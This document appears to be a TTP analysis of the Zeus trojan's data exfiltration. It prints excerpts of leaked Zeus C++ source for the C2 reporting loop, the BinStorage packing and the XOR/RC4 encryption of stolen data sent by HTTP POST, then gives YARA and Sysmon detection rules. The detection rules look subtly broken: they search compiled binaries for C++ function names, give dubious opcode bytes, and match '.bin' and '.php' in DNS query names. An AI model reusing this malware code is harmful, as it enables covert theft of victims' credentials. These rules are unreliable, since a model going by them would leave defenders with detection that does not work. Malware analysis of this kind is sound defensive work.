# Zeus: RC4 Encrypted HTTP POST Exfiltration

**Repository:** `Malware-Collection-master`  
**Files:** `Zeus/source/client/report.cpp`, `Zeus/source/common/binstorage.cpp`, `Zeus/source/common/crypt.cpp`  
**Language:** C++  
**MITRE ATT&CK:** T1041 (Exfiltration Over C2 Channel), T1071.001 (Web Protocols), T1573.001 (Symmetric Cryptography)

### Executive Summary

The Zeus botnet is renowned for its sophisticated data exfiltration architecture, which serves as a benchmark for modern malware. It uses a multi-stage process to collect, store, encrypt, and transmit stolen data via HTTP POST requests. All data is serialized into a custom binary key-value format (`BinStorage`), obfuscated with a chaining XOR cipher, and finally encrypted with RC4 before being sent to the C2 server. This layered approach, combined with robust session management and the use of standard WinInet APIs for HTTP communication, makes the traffic difficult to distinguish from legitimate web traffic without deeper inspection.

### Code Snippet & Analysis

The exfiltration process is a pipeline orchestrated between three key files. It begins in `report.cpp` which manages the sending session, passes data to `binstorage.cpp` for formatting and encryption, which in turn uses the RC4 implementation from `crypt.cpp`.

#### 1. `report.cpp`: The Sending Loop

The `startServerSession` function initiates the connection, and the inline `sendRequest` function manages the core logic for each report sent. It calls `BinStorage::_pack` to encrypt the payload and then `Wininet::_SendRequest` to send the HTTP POST.

```cpp
// File: report.cpp

// High-level function to manage the entire C2 session
bool Report::startServerSession(SERVERSESSION *session)
{
    // ... Connection and retry logic ...
    for(DWORD loop = 0;; loop++)
    {
        // Call the inline function to process and send one report
        int r = sendRequest(&ud, serverHandle, session, originalPostData, loop);
        if(r == SSPR_ERROR) break;      // Error, break loop
        else if(r == SSPR_END) { retVal = true; break; } // Success, end session
    }
    // ... Close connection ...
}

// Inline function that handles a single report
static int __inline sendRequest(HttpTools::URLDATA *ud, HINTERNET serverHandle, Report::SERVERSESSION *session, BinStorage::STORAGE *originalPostData, DWORD loop)
{
    int result = Report::SSPR_ERROR;
    // ... Logic to get the next report data into session->postData ...

    // 1. Pack and encrypt the report data. The size of the encrypted blob is returned.
    DWORD size;
    if((size = BinStorage::_pack(&session->postData, BinStorage::PACKF_FINAL_MODE, (Crypt::RC4KEY *)session->rc4Key)) > 0)
    {
        // 2. Prepare flags for the WinInet HTTP request
        DWORD requestFlags = Wininet::WISRF_METHOD_POST | Wininet::WISRF_KEEP_CONNECTION;
        if(ud->scheme == HttpTools::UDS_HTTPS) requestFlags |= Wininet::WISRF_IS_HTTPS;

        // 3. Send the encrypted data as the body of an HTTP POST request
        HINTERNET requestHandle = Wininet::_SendRequest(serverHandle, ud->uri, NULL, session->postData, size, requestFlags);
        
        if(requestHandle != NULL)
        {
            // 4. Receive and process the C2 server's response
            // ... C2 response is downloaded, unpacked, and executed ...
            result = session->resultProc(loop, session);
        }
    }
    return result;
}
```

#### 2. `binstorage.cpp`: Packing and Encrypting the Payload

The `_pack` function is the heart of the preparation stage. It finalizes the data structure, applies a "visual" XOR cipher, and then the main RC4 encryption.

```cpp
// File: binstorage.cpp

DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key)
{  
    STORAGE *newStorage = ... // Logic to prepare a clean copy of the data
    
    // 1. Calculate an MD5 hash of the clean data and store it in the header for integrity checks.
    if(!Crypt::_md5Hash(newStorage->md5Hash, ((LPBYTE)newStorage) + sizeof(STORAGE), newStorage->size - sizeof(STORAGE)))
    {
        Mem::free(newStorage);
        return 0;
    }

    // ... Add random padding data ...
    
    DWORD size = newStorage->size;
    if(rc4Key != NULL)
    {
        // 2. Apply "Visual" Encryption: a simple chaining XOR obfuscation.
        // Each byte is XORed with the previous byte.
        Crypt::_visualEncrypt(newStorage, size);

        // 3. Apply RC4 Encryption: The entire data blob is encrypted.
        Crypt::RC4KEY key;
        Mem::_copy(&key, rc4Key, sizeof(Crypt::RC4KEY));
        Crypt::_rc4(newStorage, size, &key);
    }
    
    *binStorage = newStorage;
    return size; // Return the size of the final encrypted payload
}
```

#### 3. `crypt.cpp`: The Encryption Primitives

This file contains the low-level cryptographic functions. `_visualEncrypt` is a simple obfuscation layer, while `_rc4` is the core symmetric encryption algorithm.

```cpp
// File: crypt.cpp

// "Visual" Encryption: Obfuscates the data by XORing each byte with the previous one.
// This breaks up repeating patterns before the main encryption step.
void Crypt::_visualEncrypt(void *buffer, DWORD size)
{
    for(DWORD i = 1; i < size; i++)
        ((LPBYTE)buffer)[i] ^= ((LPBYTE)buffer)[i - 1];
}

// The core RC4 encryption function. It XORs the buffer with the RC4 keystream.
void Crypt::_rc4(void *buffer, DWORD size, RC4KEY *key)
{
    register BYTE swapByte;
    register BYTE x = key->x;
    register BYTE y = key->y;
    LPBYTE state = &key->state[0];

    for(register DWORD i = 0; i < size; i++)
    {
        x = (x + 1) & 0xFF;
        y = (state[x] + y) & 0xFF;
        
        // Swap state[x] and state[y]
        swap_byte(state[x], state[y]);
        
        // XOR the buffer byte with a byte from the keystream
        ((LPBYTE)buffer)[i] ^= state[(state[x] + state[y]) & 0xFF];
    }

    key->x = x;
    key->y = y; 
}
```

### What it does

1.  **Collect & Queue:** Stolen data (credentials, system info, etc.) is formatted into a custom `BinStorage` structure and saved to an encrypted log file on disk, creating a queue of reports.
2.  **Initiate Session:** A background thread periodically connects to the C2 server to send the queued reports.
3.  **Pack & Obfuscate:** For each report, the data is first obfuscated with a chaining XOR cipher (`_visualEncrypt`). This simple step effectively hides repeating patterns from static analysis.
4.  **Encrypt:** The entire obfuscated data blob is then encrypted using the RC4 stream cipher with a session-specific key.
5.  **Exfiltrate:** The final encrypted payload is sent as the body of an HTTP POST request to the C2 server's URL (e.g., `http://domain.com/path/file.bin`).
6.  **Process C2 Response:** The malware receives, decrypts, and executes any commands returned by the C2 server in its HTTP response.

### Why it's a TTP

This is a multi-faceted TTP that combines several ATT&CK techniques:
-   **T1071.001 (Application Layer Protocol: Web Protocols):** It uses HTTP, a common and often-allowed protocol, to blend its C2 traffic with legitimate web browsing, making it harder to block at the network perimeter.
-   **T1573.001 (Encrypted Channel: Symmetric Cryptography):** By using RC4, a standard symmetric encryption algorithm, Zeus ensures that the content of its exfiltrated data is unreadable to network monitoring tools.
-   **T1041 (Exfiltration Over C2 Channel):** The entire process is a textbook example of exfiltrating data over the primary command and control channel.

The layering of a custom binary format, a simple XOR obfuscation, and a standard encryption algorithm is a sophisticated approach that significantly raises the bar for detection and analysis.

### Detection & Evasion

#### Yara

This rule targets the functions and constants involved in Zeus's custom encryption and packing process. It looks for the presence of the `_visualEncrypt` and `_rc4` functions along with evidence of the `BinStorage` packing logic.

```yara
rule TTP_Exfil_Zeus_RC4_HTTP
{
    meta:
        author = "Red Team"
        description = "Detects the Zeus exfiltration routine involving BinStorage, Visual Encryption, and RC4."
        ttp = "T1041, T1573.001"
    strings:
        // Function names related to the process
        $func_pack = "BinStorage::_pack" wide
        $func_rc4 = "Crypt::_rc4" wide
        $func_visual = "Crypt::_visualEncrypt" wide
        $func_session = "Report::startServerSession" wide

        // Specific constants from the RC4 implementation
        $rc4_const1 = { 89 E1 8A 54 0A FF D2 88 54 0A FF } // Part of the RC4 loop asm
        
    condition:
        uint16(0) == 0x5A4D and // Is a PE file
        all of ($func*) and
        $rc4_const1
}
```

#### Sysmon

Detecting Zeus traffic with Sysmon is challenging due to the use of HTTP. However, detection can focus on behavioral anomalies, such as non-browser processes making POST requests to suspicious file types. Zeus C2 endpoints often use `.bin` or `.php` files.

-   **Event ID 3 (Network Connect):** Monitor for network connections initiated by processes that are not web browsers or other legitimate applications.
-   **Event ID 22 (DnsQuery):** Correlate DNS queries for known malicious domains with subsequent network connections from suspicious processes.

```xml
<Sysmon schemaversion="4.82">
    <RuleGroup name="TTP_Exfil_Zeus_RC4_HTTP" groupRelation="and">
        <DnsQuery onmatch="include">
            <!-- This should be populated with known Zeus C2 domains -->
            <QueryName condition="contains">.bin</QueryName>
            <QueryName condition="contains">.php</QueryName>
        </DnsQuery>
        <NetworkConnect onmatch="include">
            <Image condition="not end with">chrome.exe</Image>
            <Image condition="not end with">firefox.exe</Image>
            <Image condition="not end with">iexplore.exe</Image>
            <Image condition="not end with">svchost.exe</Image>
            <!-- Add other legitimate processes that make network connections -->
            <DestinationPort>80</DestinationPort>
        </NetworkConnect>
    </RuleGroup>
</Sysmon>
```
**Note:** This Sysmon rule is highly dependent on threat intelligence (known C2 patterns) and environmental tuning (whitelisting legitimate applications) to be effective and avoid false positives.
